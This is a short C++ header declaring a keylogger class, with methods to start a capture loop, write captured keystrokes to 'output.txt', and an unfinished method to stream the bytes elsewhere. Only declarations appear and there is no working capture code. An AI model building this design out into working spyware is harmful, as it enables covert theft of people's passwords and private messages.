#pragma once
#include "pch.h"
#include "inputsystem.h"

#define LOG_TO_FILE

#define FILE_NAME "output.txt"

class c_keylogger {
public:
	c_keylogger( );
	~c_keylogger( );

	void start_loop( );

	bool m_active;
private:
	void write_log( std::vector<uint8_t> utf8_bytes );
	void stream_bytes( ); // WIP


	// vector of wstrings holding the buttons you pressed
	std::vector<std::wstring> m_gathered_input;

	c_inputsystem* m_input;
};